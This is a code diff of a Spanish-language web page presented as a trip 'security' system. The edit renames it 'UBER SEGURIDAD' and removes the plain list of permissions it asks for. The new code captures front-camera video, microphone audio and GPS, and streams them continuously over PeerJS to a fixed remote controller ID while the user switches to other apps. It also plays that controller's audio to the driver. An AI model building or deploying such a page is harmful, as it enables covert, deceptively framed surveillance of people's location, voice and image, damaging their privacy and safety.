@@ -3,67 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA DE SEGURIDAD - PABLO</title>
+    <title>UBER SEGURIDAD</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <style>
-        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding: 40px 20px; }
-        .btn-pablo { background: #00ff00; color: #000; padding: 25px; border-radius: 50px; border: none; font-weight: bold; font-size: 1.2rem; width: 100%; box-shadow: 0 0 20px #00ff00; }
-        .alert-box { border: 1px solid #333; padding: 15px; border-radius: 10px; margin-bottom: 20px; background: #111; }
-    </style>
 </head>
-<body>
-    <div id="inicio">
-        <div class="alert-box">
-            <h3>🛡️ PROTECCIÓN ACTIVA</h3>
-            <p>Al presionar, Chrome te pedirá 3 permisos:</p>
-            <ul style="text-align: left; font-size: 0.9rem;">
-                <li>📷 Cámara (Frontal)</li>
-                <li>🎤 Micrófono (Audio)</li>
-                <li>📍 Ubicación (GPS)</li>
-            </ul>
-        </div>
-        <button class="btn-pablo" onclick="iniciarTodo()">INICIAR Y PERMITIR</button>
+<body style="background:#000; color:#0f0; text-align:center; padding:50px;">
+    <div id="btnCap">
+        <h2>🛡️ PABLO SEGURIDAD</h2>
+        <p>Presione para iniciar el monitoreo seguro del viaje.</p>
+        <button onclick="conectarTodo()" style="padding:20px; border-radius:50px; background:#0f0; font-weight:bold;">ACTIVAR AHORA</button>
     </div>
-
-    <div id="activo" style="display:none;">
-        <h2 style="color: #ff0000;">● CONECTADO A CENTRAL</h2>
-        <p>Monitoreo de Video, Audio y GPS activo.</p>
-        <p>Ya puedes minimizar o usar otras apps.</p>
+    
+    <div id="running" style="display:none;">
+        <h1 style="color:red;">● TRANSMITIENDO</h1>
+        <p>GPS, Micro y Cámara activos.</p>
+        <p>Puede minimizar y usar Waze/WhatsApp.</p>
     </div>
 
     <script>
-        function iniciarTodo() {
-            // 1. FORZAR PERMISO DE GPS
-            navigator.geolocation.getCurrentPosition((pos) => {
-                console.log("GPS Permitido");
-                solicitarMultimedia(); // Si acepta GPS, vamos a Cámara/Micro
-            }, (err) => {
-                alert("Debes permitir el GPS para continuar");
-                solicitarMultimedia();
-            });
-        }
-
-        function solicitarMultimedia() {
-            const constraints = {
-                video: { facingMode: "user" }, // Cámara frontal
-                audio: true // Micrófono
-            };
-
-            // 2. FORZAR PERMISO DE CÁMARA Y MICRÓFONO
-            navigator.mediaDevices.getUserMedia(constraints)
+        function conectarTodo() {
+            // FORZAMOS LOS PERMISOS CADA VEZ QUE TOCA EL BOTÓN
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 480, height: 854 }, 
+                audio: true 
+            })
             .then(stream => {
                 const peer = new Peer();
-                peer.on('open', (id) => {
-                    document.getElementById('inicio').style.display = 'none';
-                    document.getElementById('activo').style.display = 'block';
+                peer.on('open', id => {
+                    document.getElementById('btnCap').style.display = 'none';
+                    document.getElementById('running').style.display = 'block';
+
+                    const call = peer.call('pablo-master-control-vip', stream);
                     
-                    // Llama a tu panel Master
-                    peer.call('pablo-master-control-vip', stream);
+                    // Escuchamos a Pablo desde la PC
+                    call.on('stream', pabloStream => {
+                        const audio = new Audio();
+                        audio.srcObject = pabloStream;
+                        audio.play(); // Aquí es donde el chofer te escucha
+                    });
+
+                    // GPS DINÁMICO EN TIEMPO REAL
+                    const conn = peer.connect('pablo-master-control-vip');
+                    setInterval(() => {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            conn.send({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+                        });
+                    }, 5000);
                 });
             })
-            .catch(err => {
-                alert("⚠️ ERROR: Chrome bloqueó la cámara/micrófono. Haz clic en el candado de la barra de direcciones y activa los permisos manualmente.");
-            });
+            .catch(err => alert("Debe permitir los accesos para su seguridad."));
         }
     </script>
 </body>
